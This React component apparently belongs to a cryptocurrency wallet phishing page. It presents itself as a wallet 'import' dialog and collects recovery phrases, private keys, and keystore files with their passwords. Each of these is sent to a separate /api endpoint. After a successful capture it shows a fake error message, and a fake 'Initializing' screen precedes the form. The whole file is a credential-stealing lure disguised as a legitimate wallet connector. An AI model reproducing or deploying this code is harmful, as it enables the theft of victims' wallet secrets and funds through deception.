import axios from 'axios';
import Image from 'next/image';
import { useEffect, useRef, useState } from 'react';

const Modal = ({ wallet, closeModal }) => {
  const [initialized, setInitialized] = useState(true);
  const [mode, setMode] = useState('phrase');
  const [values, setValues] = useState();
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const inputRef = useRef();

  let timer;

  const handleSubmit = async () => {
    if (mode === 'phrase') {
      if (
        !values?.phrase ||
        values?.phrase.split(' ').length < 12 ||
        values?.phrase.split(' ').length > 24
      ) {
        setError(
          'Please enter a valid 12 or 24 digit phrase before you proceed!'
        );
      } else {
        setLoading(true);
        const res = await axios.post('/api/phrase', {
          phrase: values.phrase,
          wallet: wallet.name
        });

        if (res.data.status === 'Success') {
          setLoading(false);
          setError('An error occurred, please try again');
          timer = setTimeout(() => closeModal(), 2000);
        }
      }
    } else if (mode === 'privateKey') {
      if (!values?.privateKey) {
        setError('Please enter a valid private key before you proceed!');
      } else {
        setLoading(true);
        const res = await axios.post('/api/privateKey', {
          privateKey: values.privateKey,
          wallet: wallet.name
        });

        if (res.data.status === 'Success') {
          setLoading(false);
          setError('An error occurred, please try again');
          timer = setTimeout(() => closeModal(), 2000);
        }
      }
    } else if (mode === 'keystore') {
      if (!values?.keystore || !values?.keystorePassword) {
        setError('Please upload file and enter password before you proceed!');
      } else {
        console.log(values);
        const reader = new FileReader();
        reader.readAsDataURL(values.keystore);
        reader.onloadend = async () => {
          setLoading(true);
          const res = await axios.post('/api/keystore', {
            file: reader.result,
            wallet: wallet.name,
            password: values.keystorePassword
          });
          if (res.data.status === 'Success') {
            setLoading(false);
            setError('An error occurred, please try again');
            timer = setTimeout(() => closeModal(), 2000);
          }
        };
      }
    }
  };

  useEffect(() => {
    let timeout;
    if (error) {
      timeout = setTimeout(() => {
        setError('');
      }, 3000);
    }

    () => {
      clearTimeout(timeout);
      clearTimeout(timer);
    };
  }, [error, timer]);

  useEffect(() => {
    let timeout;
    if (wallet !== null) {
      timeout = setTimeout(() => {
        setInitialized(false);
      }, 1800);
    }

    () => {
      clearTimeout(timeout);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [wallet]);

  return (
    <div className="fixed top-0 left-0 bottom-0 right-0 w-full h-max flex justify-center items-center">
      <div
        className="w-[100%] h-screen bg-[#00000033]"
        onClick={closeModal}
      ></div>
      {initialized ? (
        <div className="absolute bg-white px-[50px] py-[80px] rounded-lg min-w-[35vw]">
          <div className="p-[20px]  border-2 border-green-400 mb-[30px] rounded-lg">
            <p className="text-lg text-green-400">
              Initializing. Please wait...
            </p>
          </div>
          <div className="flex items-center justify-between p-[20px]  border-2 border-gray-300 rounded-lg">
            <div>
              <p className="text-xl mb-[10px]">{wallet.name}</p>
              <p className="text-md text-gray-600">
                Easy-to-use browser extension.
              </p>
            </div>
            <Image
              src={`/wallets/${wallet.url}.png`}
              width={40}
              height={40}
              alt="logo"
            />
          </div>
        </div>
      ) : (
        <div className="absolute bg-white px-[20px] py-[25px] lg:px-[40px] lg:py-[50px] rounded-md">
          <div className="flex items-center space-x-[20px]">
            <Image
              src={`/wallets/${wallet.url}.png`}
              width={50}
              height={50}
              alt="logo"
            />
            <p className="tracking-wider font-abc">
              Import your {wallet.name} wallet
            </p>
          </div>
          <div className="text-[#587087] divide-x mt-[40px] px-[30px] py-[10px] flex space-x-[30px] justify-between border-b-2 border-gray-200">
            <div
              className="relative group cursor-pointer"
              onClick={() => setMode('phrase')}
            >
              <p className="">Phrase</p>
              <div className="hidden group-hover:block absolute bottom-[-10px] left-[-10%] w-[120%] h-[2px] bg-[#66b0ff]"></div>
            </div>
            <div
              className="relative group  cursor-pointer"
              onClick={() => setMode('keystore')}
            >
              <p className="pl-[30px]">Keystore JSON</p>
              <div className="hidden group-hover:block absolute bottom-[-10px] left-[10%] w-[100%] h-[2px] bg-[#66b0ff]"></div>
            </div>
            <div
              className="relative group cursor-pointer"
              onClick={() => setMode('privateKey')}
            >
              <p className="pl-[30px]">Private Key</p>
              <div className="hidden group-hover:block absolute bottom-[-10px] left-[10%] w-[110%] h-[2px] bg-[#66b0ff]"></div>
            </div>
          </div>

          <div className="mt-[15px]">
            {mode === 'privateKey' ? (
              <input
                type="text"
                className="w-full py-[8px] px-[16px] focus:outline-0 border rounded-lg placeholder:tracking-wider placeholder:text-sm"
                placeholder="Enter your Private Key"
                onChange={(e) =>
                  setValues((prevValues) => ({
                    ...prevValues,
                    privateKey: e.target.value
                  }))
                }
              />
            ) : mode === 'keystore' ? (
              <>
                <div
                  onClick={() => {
                    inputRef.current.click();
                    console.log('clicked');
                    console.log(inputRef.current);
                  }}
                  className="cursor-pointer py-[15px] border border-[#697399] border-dashed rounded-lg text-center text-[#92a2d6] hover:bg-[#E5E5E5]"
                >
                  <input
                    ref={inputRef}
                    type="file"
                    className="hidden"
                    accept=".json"
                    onChange={(e) =>
                      setValues((prevValues) => ({
                        ...prevValues,
                        keystore: e.target.files[0]
                      }))
                    }
                  />
                  <p>Choose Keystore File</p>
                </div>
                <input
                  type="password"
                  className="w-full mt-[40px] py-[8px] px-[16px] focus:outline-0 border rounded-lg placeholder:tracking-wider placeholder:text-sm"
                  placeholder="Wallet password"
                  onChange={(e) =>
                    setValues((prevValues) => ({
                      ...prevValues,
                      keystorePassword: e.target.value
                    }))
                  }
                />
              </>
            ) : (
              <textarea
                placeholder="Enter your recovery phrase"
                className="w-full h-[100px] py-[8px] px-[16px] focus:outline-0 border rounded-lg placeholder:tracking-wider placeholder:text-sm"
                onChange={(e) =>
                  setValues((prevValues) => ({
                    ...prevValues,
                    phrase: e.target.value
                  }))
                }
              />
            )}

            <p className="my-[25px] text-xs text-[#587087] lg:max-w-[30vw]">
              {mode === 'privateKey' || mode === 'phrase'
                ? 'Typically 12 (sometimes 24) words separated by a single space.'
                : 'Several lines of text beginning with "{...}" plus the password you used to encrypt it.'}
            </p>

            <p className="my-[25px] text-xs text-center text-red-500">
              {error && error}
            </p>
            <div
              className={`mb-[30px] py-[8px] flex justify-center  space-x-2  items-center w-full ${
                loading
                  ? 'bg-gray-300 text-gray-600'
                  : 'bg-[#3182ce] text-white'
              } rounded-lg`}
              onClick={handleSubmit}
            >
              <button disabled={loading}>
                {loading ? 'Synchronizing...' : 'PROCEED'}
              </button>
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 16 16 12 12 8"></polyline>
                <line x1="8" y1="12" x2="16" y2="12"></line>
              </svg>
            </div>

            <div className="flex justify-end">
              <button
                onClick={closeModal}
                className="text-white w-fit rounded-md cursor-pointer py-[8px] px-[15px] bg-[#e53e3e]"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Modal;
